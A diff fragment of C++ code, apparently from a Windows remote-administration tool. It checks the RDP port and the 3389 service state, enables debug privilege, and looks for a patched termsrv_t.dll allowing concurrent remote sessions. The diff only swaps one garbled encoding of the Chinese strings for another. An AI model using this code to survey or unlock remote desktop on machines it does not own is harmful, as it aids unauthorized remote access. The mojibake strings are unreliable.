-	//è¯»å–è¿œç¨‹ç«¯å£
+	//¶ÁÈ¡Ô¶³Ì¶Ë¿Ú
 	GetPort(_T("RDP-Tcp"),pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
-	//3389çŠ¶æ€
+	//3389×´Ì¬
 	TCHAR szSystem[32], szDllName[MAX_PATH];
 	SC_HANDLE hSCManager, schService;
 	SERVICE_STATUS   ssStatus;
@@ -1685,7 +1685,7 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 					lstrcat(strDll, _T("\\termsrv_t.dll"));
 					EnablePrivilege(SE_DEBUG_NAME, TRUE);
 					HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
-					//æŸ¥æ‰¾ç›¸å…³çš„è¿›ç¨‹
+					//²éÕÒÏà¹ØµÄ½ø³Ì
 					if(Process32First(hProcessSnap, &pe32))
 					{
 						do
@@ -1702,35 +1702,35 @@ void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
 					EnablePrivilege(SE_DEBUG_NAME, FALSE);
 					if (bRet)
 					{
-						wsprintf(pSysInfo->szOpenInfo, _T("å·²å¼€å¯ä¸”å·²åŒå¼€"));
+						wsprintf(pSysInfo->szOpenInfo, _T("ÒÑ¿ªÆôÇÒÒÑË«¿ª"));
 						return;
 					}
 					else
 					{
-						wsprintf(pSysInfo->szOpenInfo, _T("å·²å¼€å¯ä½†æœªåŒå¼€"));
+						wsprintf(pSysInfo->szOpenInfo, _T("ÒÑ¿ªÆôµ«Î´Ë«¿ª"));
 						return;
 					}
 				}
 				else
 				{
-					wsprintf(pSysInfo->szOpenInfo, _T("å·²å¼€å¯ä½†æœªåŒå¼€"));
+					wsprintf(pSysInfo->szOpenInfo, _T("ÒÑ¿ªÆôµ«Î´Ë«¿ª"));
 					return;
 				}
 			}
 			else
 			{
-				wsprintf(pSysInfo->szOpenInfo, _T("å·²å¼€å¯ä¸”æ— éœ€åŒå¼€"));
+				wsprintf(pSysInfo->szOpenInfo, _T("ÒÑ¿ªÆôÇÒÎŞĞèË«¿ª"));
 				return;
 			}
 		}
 		else
 		{
-			wsprintf(pSysInfo->szOpenInfo, _T("æœªå…è®¸è¿æ¥3389"));
+			wsprintf(pSysInfo->szOpenInfo, _T("Î´ÔÊĞíÁ¬½Ó3389"));
 			return;
 		}
 	}
 	else
 	{
-		wsprintf(pSysInfo->szOpenInfo, _T("æœªå¼€å¯3389æœåŠ¡"));
+		wsprintf(pSysInfo->szOpenInfo, _T("Î´¿ªÆô3389·şÎñ"));
 	}
 }
